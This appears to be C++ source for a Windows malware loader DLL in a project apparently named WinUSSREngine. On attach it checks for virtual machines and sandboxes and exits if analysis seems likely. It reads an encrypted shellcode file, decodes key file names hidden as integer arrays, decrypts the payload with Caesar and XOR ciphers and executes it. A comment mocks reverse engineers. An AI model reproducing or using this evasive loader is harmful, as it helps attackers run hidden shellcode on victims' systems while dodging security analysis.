#include "DllLayer.h"
#include <WinUSSREngine.h>

/*
* Yes, the names were made to fuck with people who wanted to reverse
* engineer this program. Good luck doing that in the first place.
*/

namespace WinUSSREngine
{
	void DllLayer::OnAttach()
	{
		AntiVM novm;
		AntiSandbox nosandbox;
		if (!(!novm.isVMGuestModules() || novm.isMouseSamePos())
			|| !(nosandbox.canDebugbreak() || !nosandbox.foundSandboxModules())) return;

		ShellExec shell;
		Shellcode payload;

		// load wikipedia.bin
		std::vector<int> plfname = { 0x17, 0x09, 0x0b, 0x09, 0x10, 0x05, 0x04, 0x09, 0x01, 0x2e, 0x02, 0x09, 0x0e };
		payload.readFile(StringTools::toString(plfname));

		Scope<CipherModule> xormod = CipherModule::CreateXOR();
		Scope<CipherModule> caesar = CipherModule::CreateCaesar();

		// load donkey.bin
		std::vector<int> xorkey = { 0x04, 0x0f, 0x0e, 0x0b, 0x05, 0x19, 0x2e, 0x02, 0x09, 0x0e };
		xormod->fromFile(StringTools::toString(xorkey));

		// load shrek.bin
		std::vector<int> caesarkey = { 0x13, 0x08, 0x12, 0x05, 0x0b, 0x2e, 0x02, 0x09, 0x0e };
		caesar->fromFile(StringTools::toString(caesarkey));

		std::string plstr = payload.string();
		payload.reset();

		caesar->decrypt(plstr);
		xormod->decrypt(plstr);

		payload.toBytes(plstr);

		if (!(!novm.isVMGuestModules() || novm.isMouseSamePos())
			|| !(nosandbox.canDebugbreak() || !nosandbox.foundSandboxModules())) return;
		shell.run(payload);
	}

	void DllLayer::OnDetach()
	{
	}

	void DllLayer::OnUpdate()
	{
	}

	void DllLayer::OnEvent(Event& e)
	{
	}
}